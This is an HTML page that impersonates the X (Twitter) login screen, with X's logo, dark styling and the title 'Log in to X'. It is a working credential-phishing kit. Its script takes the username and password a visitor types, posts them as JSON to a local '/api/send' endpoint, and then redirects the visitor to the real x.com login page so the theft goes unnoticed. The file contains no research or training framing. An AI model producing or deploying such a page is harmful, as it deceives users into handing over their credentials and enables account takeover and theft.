<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to X</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #000; border: 1px solid #333; border-radius: 16px; padding: 40px; width: 300px; text-align: center; }
        .logo { width: 40px; margin-bottom: 20px; fill: #fff; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; border-radius: 4px; color: #fff; box-sizing: border-box; font-size: 15px; }
        button { width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 9999px; font-weight: bold; font-size: 15px; margin-top: 10px; cursor: pointer; }
        .error { color: #f4212e; font-size: 14px; margin-bottom: 10px; display: none; }
        .footer { color: #71767b; font-size: 13px; margin-top: 20px; text-align: left;}
    </style>
</head>
<body>
    <div class="box">
        <svg class="logo" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
        <div class="error" id="errorMsg">Incorrect username or password.</div>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Phone, email, or username" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit" id="submitBtn">Log in</button>
        </form>
        <div class="footer">Don't have an account? Sign up</div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.innerText = 'Logging in...';
            btn.disabled = true;
            document.getElementById('errorMsg').style.display = 'none';

            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value
            };

            try {
                const response = await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                if (response.ok) {
                    window.location.href = 'https://x.com/login';
                } else {
                    throw new Error();
                }
            } catch (err) {
                document.getElementById('errorMsg').style.display = 'block';
                btn.innerText = 'Log in';
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
